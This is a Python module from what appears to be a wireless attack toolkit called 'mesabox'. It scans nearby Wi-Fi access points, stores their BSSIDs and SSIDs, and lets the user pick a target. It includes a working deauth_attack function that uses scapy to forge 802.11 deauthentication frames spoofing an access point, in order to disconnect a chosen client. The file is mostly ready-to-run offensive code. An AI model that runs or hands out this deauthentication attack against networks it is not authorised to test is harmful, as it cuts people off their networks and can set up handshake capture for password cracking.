import subprocess
import re
import json
import os
import shutil
import platform
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

BSSID_JSON_PATH = os.path.expanduser("~/.mesabox_bssid_list.json")

def scan_bssid(interface="wlan0", save=False):
    if platform.system().lower() == "windows":
        print("[ERROR] Wi-Fi BSSID/SSID scan is not supported on Windows.")
        return []
    print(f"[INFO] Starting BSSID/SSID scan on {interface}")
    bssid_ssid_list = []
    scan_output = None
    if shutil.which("iwlist"):
        print("[INFO] Using 'iwlist' for scan.")
        try:
            scan_output = subprocess.check_output(
                ["sudo", "iwlist", interface, "scan"],
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            print("[INFO] iwlist scan finished, parsing results...")
            cells = re.split(r'Cell \d+ - ', scan_output)[1:]
            for cell in cells:
                bssid_match = re.search(r'Address: ([0-9A-Fa-f:]{17})', cell)
                ssid_match = re.search(r'ESSID:"(.*?)"', cell)
                if bssid_match:
                    bssid = bssid_match.group(1)
                    ssid = ssid_match.group(1) if ssid_match else ""
                    ssid = ssid.replace('\x00', '').strip()
                    bssid_ssid_list.append({'bssid': bssid, 'ssid': ssid})
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] BSSID scan with iwlist: {e.output}")
            return []
        except Exception as e:
            print(f"[ERROR] BSSID scan with iwlist: {e}")
            return []
    elif shutil.which("iw"):
        print("[INFO] Using 'iw' for scan.")
        try:
            scan_output = subprocess.check_output(
                ["sudo", "iw", "dev", interface, "scan"],
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            print("[INFO] iw scan finished, parsing results...")
            current_bssid = None
            current_ssid = ""
            for line in scan_output.splitlines():
                line = line.strip()
                if line.startswith("BSS "):
                    if current_bssid:
                        bssid_ssid_list.append({'bssid': current_bssid, 'ssid': current_ssid})
                    current_bssid = line.split()[1].split('(')[0].strip()[:17]
                    current_ssid = ""
                elif line.startswith("SSID:"):
                    current_ssid = line[5:].strip()
            if current_bssid:
                bssid_ssid_list.append({'bssid': current_bssid, 'ssid': current_ssid})
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] BSSID scan with iw: {e.output}")
            return []
        except Exception as e:
            print(f"[ERROR] BSSID scan with iw: {e}")
            return []
    else:
        print("[ERROR] Neither 'iwlist' nor 'iw' found in PATH.")
        return []

    if not bssid_ssid_list:
        print("[INFO] No networks detected. Check your interface and root privileges.")
        return []

    print("[RESULT] Detected BSSID/SSID:")
    for entry in bssid_ssid_list:
        print(f"{entry['bssid']} - {entry['ssid']}")

    if save:
        print(f"[INFO] Saving results to {BSSID_JSON_PATH} ...")
        try:
            with open(BSSID_JSON_PATH, "w") as f:
                json.dump(bssid_ssid_list, f, indent=2)
            print(f"[OK] List saved to {BSSID_JSON_PATH}")
        except Exception as e:
            print(f"[ERROR] Saving JSON: {e}")

    print("[INFO] BSSID/SSID scan finished.")
    return bssid_ssid_list

def load_bssid_list():
    print(f"[INFO] Loading BSSID/SSID list from {BSSID_JSON_PATH} ...")
    if not os.path.exists(BSSID_JSON_PATH):
        print("[INFO] No saved BSSID list found.")
        return []
    try:
        with open(BSSID_JSON_PATH, "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"[ERROR] Loading JSON: {e}")
        return []

def deauth_attack(target_bssid, client_mac, interface="wlan0", count=100):
    import os, sys
    if platform.system().lower() == "windows":
        print("[ERROR] Deauth attack is not supported on Windows.")
        return
    print(f"[INFO] Preparing deauth attack on {interface}")
    if os.geteuid() != 0:
        print("[ERROR] This attack requires root privileges (sudo).")
        print("Run with sudo: sudo python3 mesabox_cli.py")
        sys.exit(1)
    print(f"[INFO] Sending {count} deauth packets on {interface} from {target_bssid} to {client_mac}...")
    sendp(RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(),
          iface=interface, count=count, inter=0.1, verbose=1)
    print("[INFO] Deauth attack finished.")

def select_bssid_from_list(bssid_list):
    print("[INFO] Selecting a saved BSSID...")
    if not bssid_list:
        print("No saved BSSID.")
        return None
    print("Select a BSSID:")
    for idx, entry in enumerate(bssid_list):
        print(f"{idx+1}. {entry['bssid'][:17]} - {entry['ssid']}")
    choice = input("BSSID number to use (or enter to cancel): ")
    if not choice.isdigit() or not (1 <= int(choice) <= len(bssid_list)):
        print("Cancelled.")
        return None
    return bssid_list[int(choice)-1]['bssid'][:17]
